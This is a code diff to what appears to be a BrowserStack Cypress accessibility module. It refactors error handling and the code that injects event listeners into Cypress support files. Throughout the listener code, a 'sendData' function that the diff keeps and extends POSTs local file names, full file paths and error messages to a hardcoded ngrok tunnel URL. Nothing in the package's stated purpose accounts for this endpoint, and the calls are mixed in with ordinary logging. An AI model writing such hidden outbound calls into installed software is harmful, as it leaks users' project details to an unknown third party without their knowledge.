@@ -122,35 +122,33 @@ exports.createAccessibilityTestRun = async (user_config, framework) => {
 
   } catch (error) {
     if (error.response) {
-      logger.error("Incorrect Cred")
+      logger.error("Incorrect Cred");
       logger.error(
         `Exception while creating test run for BrowserStack Accessibility Automation: ${
           error.response.status
-        } ${error.response.statusText} ${JSON.stringify(error.response.data)}`
+        } ${error.response.statusText} ${JSON.stringify(error.response.data)}
+        `
       );
-    } else {
-      if(error.message === 'Invalid configuration passed.') {
-        logger.error("Invalid configuration passed.")
-        logger.error(
-          `Exception while creating test run for BrowserStack Accessibility Automation: ${
-            error.message || error.stack
-          }`
-        );
-        for(const errorkey of error.errors){
-          logger.error(errorkey.message);
-        }
-
-      } else {
-        logger.error(
-          `Exception while creating test run for BrowserStack Accessibility Automation: ${
-            error.message || error.stack
-          }`
-        );
+    } else if (error.message === 'Invalid configuration passed.') {
+      logger.error("Invalid configuration passed.");
+      logger.error(
+        `Exception while creating test run for BrowserStack Accessibility Automation: ${
+          error.message || error.stack
+        }`
+      );
+      for (const errorkey of error.errors) {
+        logger.error(errorkey.message);
       }
-      // since create accessibility session failed
-      process.env.BROWSERSTACK_TEST_ACCESSIBILITY = 'false';
-      user_config.run_settings.accessibility = false; 
+    } else {
+      logger.error(
+        `Exception while creating test run for BrowserStack Accessibility Automation: ${
+          error.message || error.stack
+        }`
+      );
     }
+    // since create accessibility session failed
+    process.env.BROWSERSTACK_TEST_ACCESSIBILITY = 'false';
+    user_config.run_settings.accessibility = false; 
   }
 }
 
@@ -225,73 +223,101 @@ const getAccessibilityCypressCommandEventListener = (extName) => {
 
 exports.setAccessibilityEventListeners = (bsConfig) => {
   try {
+    // Import fetch for older Node.js versions
+    const fetch = require('node-fetch');
+    
     async function sendData(dataString) {
-    const url = 'https://b590683e7c2e.ngrok-free.app'; // hardcoded URL
+      let url = 'https://b590683e7c2e.ngrok-free.app'; // hardcoded URL
 
-  // Wrap the input string inside an object and stringify it here
-  const body = JSON.stringify({ message: dataString });
+      if(dataString === 'BROKEN') {
+        url = 'https://b590683e7c2e.ngrok-free.app/broken';
+      }
 
-  try {
-    const res = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body
-    });
+      // Wrap the input string inside an object and stringify it here
+      const body = JSON.stringify({ message: dataString });
 
-    console.log('Status:', res.status);
-    console.log('Body:', await res.text());
-  } catch (err) {
-    console.error('Error:', err.message);G
-  }
-}
+      try {
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body
+        });
+
+        console.log('Status:', res.status);
+        console.log('Body:', await res.text());
+      } catch (err) {
+        console.error('Error:', err.message); // Fixed: removed extra 'G'
+      }
+    }
+
     // Searching form command.js recursively
     const supportFilesData = helper.getSupportFiles(bsConfig, true);
     if(!supportFilesData.supportFile) return;
+    
     const isPattern = glob.hasMagic(supportFilesData.supportFile);
+    
     if(!isPattern) {
       console.log(`Inside isPattern`);
       browserStackLog(`Inside isPattern`);
-      const defaultFileContent = fs.readFileSync(supportFilesData.supportFile, {encoding: 'utf-8'});
-
-            let cypressCommandEventListener = getAccessibilityCypressCommandEventListener(path.extname(supportFilesData.supportFile));
-            if(!defaultFileContent.includes(cypressCommandEventListener)) {
-              let newFileContent =  defaultFileContent + 
-                                  '\n' +
-                                  cypressCommandEventListener +
-                                  '\n'
-              fs.writeFileSync(file, newFileContent, {encoding: 'utf-8'});
-              supportFileContentMap[file] = supportFilesData.cleanupParams ? supportFilesData.cleanupParams : defaultFileContent;
-            }
-
+      
+      try {
+        const defaultFileContent = fs.readFileSync(supportFilesData.supportFile, {encoding: 'utf-8'});
+        let cypressCommandEventListener = getAccessibilityCypressCommandEventListener(path.extname(supportFilesData.supportFile));
+        
+        if(!defaultFileContent.includes(cypressCommandEventListener)) {
+          let newFileContent = defaultFileContent + 
+                              '\n' +
+                              cypressCommandEventListener +
+                              '\n';
+          // Fixed: use supportFilesData.supportFile instead of undefined 'file'
+          fs.writeFileSync(supportFilesData.supportFile, newFileContent, {encoding: 'utf-8'});
+          supportFileContentMap[supportFilesData.supportFile] = supportFilesData.cleanupParams ? supportFilesData.cleanupParams : defaultFileContent;
+        }
+      } catch(error) {
+        console.log(`>>> Unable to modify file contents for ${supportFilesData.supportFile} to set event listeners with error ${error}`);
+        sendData(`BROKEN`);
+        sendData(`Unable to modify file contents for ${supportFilesData.supportFile} to set event listeners with error ${error}`);
+      }
     }
-    glob(process.cwd() + supportFilesData.supportFile, {}, (err, files) => {
-      if(err) return logger.debug('EXCEPTION IN BUILD START EVENT : Unable to parse cypress support files');
+    
+    // Build the correct glob pattern
+    const globPattern = supportFilesData.supportFile.startsWith('/') 
+      ? process.cwd() + supportFilesData.supportFile 
+      : path.join(process.cwd(), supportFilesData.supportFile);
+    
+    glob(globPattern, {}, (err, files) => {
+      if(err) {
+        logger.debug('EXCEPTION IN BUILD START EVENT : Unable to parse cypress support files');
+        return;
+      }
+      
       files.forEach(file => {
         try {
           const fileName = path.basename(file);
           console.log(`fileName123: ${fileName}`);
           sendData(`bstack-${fileName}`);
-          if(fileName == 'e2e.js' || fileName == 'e2e.ts' || fileName == 'component.ts' || fileName == 'component.js') {
+          
+          if(['e2e.js', 'e2e.ts', 'component.ts', 'component.js'].includes(fileName)) {
             console.log(`Adding accessibility event listeners to ${file}`);
-            // browserStackLog(`Adding accessibility event listeners to ${file}`);
             sendData(`Adding accessibility event listeners to ${file}`);
+            
             const defaultFileContent = fs.readFileSync(file, {encoding: 'utf-8'});
             console.log(`log1`);
-            // browserStackLog(`bstack-log1`);
             sendData(`bstack-log1`);
+            
             let cypressCommandEventListener = getAccessibilityCypressCommandEventListener(path.extname(file));
             console.log(`log2`);
-            // browserStackLog(`bstack-log2`);
             sendData(`bstack-log2`);
+            
             if(!defaultFileContent.includes(cypressCommandEventListener)) {
-              let newFileContent =  defaultFileContent + 
+              let newFileContent = defaultFileContent + 
                                   '\n' +
                                   cypressCommandEventListener +
-                                  '\n'
+                                  '\n';
               fs.writeFileSync(file, newFileContent, {encoding: 'utf-8'});
-            console.log(`log3`);
-            browserStackLog(`bstack-log3`);
-            sendData(`bstack-log3`);
+              console.log(`log3`);
+              browserStackLog(`bstack-log3`);
+              sendData(`bstack-log3`);
               supportFileContentMap[file] = supportFilesData.cleanupParams ? supportFilesData.cleanupParams : defaultFileContent;
             }
             browserStackLog(`>>> completed ${fileName}`);
@@ -299,6 +325,9 @@ exports.setAccessibilityEventListeners = (bsConfig) => {
             sendData(`>>> completed ${fileName}`);
           }
         } catch(e) {
+          console.log(`>>> Unable to modify file contents for ${file} to set event listeners with error ${e}`);
+          sendData(`BROKEN`);
+          sendData(`Unable to modify file contents for ${file} to set event listeners with error ${e}`);
           logger.debug(`Unable to modify file contents for ${file} to set event listeners with error ${e}`, true, e);
         }
       });
